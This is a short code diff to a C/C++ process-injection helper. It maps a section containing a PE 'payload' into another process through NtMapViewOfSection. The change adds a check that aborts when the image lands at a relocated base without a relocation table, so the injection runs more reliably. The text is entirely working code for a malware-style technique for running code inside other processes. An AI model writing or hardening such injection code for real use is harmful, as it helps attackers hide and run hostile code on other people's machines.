@@ -32,7 +32,7 @@ static bool load_map_api()
     return g_NtMapViewOfSection != nullptr;
 }
 
-PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_size)
+PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_size, const BYTE *pe_buffer)
 {
     if (!load_map_api()) {
         printf("[injection_helpers] NtMapViewOfSection not available\n");
@@ -52,9 +52,15 @@ PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_s
            (unsigned long)status, base_address, (ULONGLONG)view_size);
     
     if (status != 0) {
-        /* STATUS_IMAGE_NOT_AT_BASE (0x40000003) is a warning, not fatal */
+        /* STATUS_IMAGE_NOT_AT_BASE (0x40000003): image mapped at a different base due to ASLR.
+           Only safe to continue if the PE has a relocation table; without one, all absolute
+           addresses in the image are wrong at the new base and the process will crash. */
         if ((ULONG)status == 0x40000003) {
-            printf("[injection_helpers] WARNING: Image could not be mapped at its original base\n");
+            if (!pe_has_relocations(pe_buffer)) {
+                printf("[injection_helpers] STATUS_IMAGE_NOT_AT_BASE and PE has no relocations - cannot run at relocated base, aborting\n");
+                return nullptr;
+            }
+            printf("[injection_helpers] WARNING: Image mapped at non-preferred base (has relocations, continuing)\n");
         } else {
             printf("[injection_helpers] NtMapViewOfSection failed: 0x%lX\n", (unsigned long)status);
             return nullptr;
